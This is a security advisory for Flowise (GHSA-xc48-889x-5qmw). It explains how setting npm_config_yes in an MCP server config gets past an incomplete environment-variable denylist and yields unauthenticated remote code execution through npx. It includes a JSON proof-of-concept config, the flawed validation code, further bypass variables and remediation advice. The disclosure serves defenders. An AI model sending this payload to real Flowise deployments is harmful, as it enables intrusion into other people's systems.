# [H] Flowise: CVE-2025-8943 Patch Bypass: npm_config_yes bypasses MCP environment variable blocklist (Unauthenticated RCE)

## Summary
Severity: High
Advisory: GHSA-xc48-889x-5qmw
CVE: CVE-2026-69263
CWE: CWE-184
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-08-04
Source: https://github.com/advisories/GHSA-xc48-889x-5qmw
Type: github-advisory

## Affected
- npm: `flowise` — affected >=0 <3.1.3
- npm: `flowise-components` — affected >=0 <3.1.3

## Details
## Summary

The mitigation shipped for CVE-2025-8943 blocks the `-y` and `--yes` flags on `npx` to stop auto-installation of arbitrary packages. That flag filter works. The environment-variable check in the same patch denies only four variable names by exact string match, and `npm` reads its configuration directly from `npm_config_*` environment variables. Setting `npm_config_yes=true` reproduces the `--yes` behaviour the flag filter is meant to prevent, so `npx` auto-installs and executes the named package. The mitigation is fully bypassed.

This works with the MCP security check enabled (`CUSTOM_MCP_SECURITY_CHECK=true`). On a default Flowise deployment, which ships with no authentication, the result is unauthenticated remote code execution.

## Root cause

The patch treats this as a flag-filtering problem, but the behaviour gated by `--yes` is also reachable through `npm`'s environment-based configuration. The same is true for the other permitted interpreters, `node` and `python3`. A denylist of variable names cannot enumerate every environment variable that alters execution, so the control is incomplete by construction. The fix is to allowlist (or strip) the environment before it reaches the child process, not to extend the denylist.

## Affected version

Flowise 3.1.1, current as of 2026-03-29.

## Details

Validation happens in `packages/components/nodes/tools/MCP/core.ts`. Two functions run in sequence before any MCP server launches: `validateCommandFlags` and `validateEnvironmentVariables`.

`validateCommandFlags` is thorough. It blocks `-y` and `--yes` along with a comprehensive set of dangerous flags across `npx`, `node`, `python`, `python3`, and `docker`. That part of the patch is sound.

The gap is in `validateEnvironmentVariables`:

```typescript
export const validateEnvironmentVariables = (env: Record<string, any>): void => {
    const dangerousEnvVars = ['PATH', 'LD_LIBRARY_PATH', 'DYLD_LIBRARY_PATH', 'NODE_OPTIONS']
    for (const [key, value] of Object.entries(env)) {
        if (dangerousEnvVars.includes(key)) {
            throw new Error(`Environment variable '${key}' modification is not allowed`)
        }
        if (typeof value === 'string' && value.includes('\0')) {
            throw new Error(`Environment variable '${key}' contains null byte`)
        }
    }
}
```

The blocklist is a hardcoded four-item array checked by exact match. Any variable not in that list passes through unchecked. `npm_config_yes` is npm's documented mechanism for setting the `yes` config via the environment. Set to `true`, it causes `npx` to auto-install without prompting, which is exactly what the `-y` and `--yes` flag blocks are intended to prevent.

## Proof of concept

The following MCP server configuration bypasses the patch with `CUSTOM_MCP_SECURITY_CHECK=true`:

```json
{
  "mcpServers": {
    "bypass": {
      "command": "npx",
      "args": ["malicious-package"],
      "env": {
        "npm_config_yes": "true"
      }
    }
  }
}
```

Execution path:

1. `validateCommandFlags` passes, because `args` contains no blocked flags.
2. `validateEnvironmentVariables` passes, because `npm_config_yes` is not in the four-item blocklist.
3. `npx` auto-installs and executes the named package with the privileges of the Flowise process.

On a default deployment with no authentication, any unauthenticated user who can reach the Flowise API can trigger this.

## Additional bypass vectors (same root cause)

The following variables are also absent from the blocklist and influence execution through the other permitted interpreters:

| Variable | Command | Effect |
|---|---|---|
| `npm_config_prefix` | `npx` | Redirects package installation to attacker-controlled path |
| `npm_config_userconfig` | `npx` | Loads attacker-controlled `.npmrc` configuration |
| `NODE_PATH` | `node` | Loads modules from attacker-controlled path |
| `PYTHONPATH` | `python3` | Loads modules from attacker-controlled path |
| `PYTHONSTARTUP` | `python3` | Executes a file on interpreter startup (interactive sessions only) |

## Impact

Full remote code execution with the privileges of the Flowise process. On default deployments with no authentication, no credentials are required.

## Remediation

Strip the `env` object before passing it to the child process, or replace the name blocklist with an allowlist of explicitly permitted variables.

Adding the known dangerous variables to the blocklist (`npm_config_yes`, `npm_config_prefix`, `npm_config_userconfig`, `NODE_PATH`, `PYTHONPATH`, `PYTHONSTARTUP`) narrows the immediate gap but is a stopgap. Any future permitted interpreter reintroduces the same class of bypass.

## References

- CVE-2025-8943
- CWE-184: Incomplete List of Disallowed Inputs

## References
- https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-xc48-889x-5qmw
- https://github.com/FlowiseAI/Flowise/pull/6471
- https://github.com/FlowiseAI/Flowise/commit/a4c4e4988cded15edf725e762560575b889ae351
- https://github.com/FlowiseAI/Flowise
- https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.3
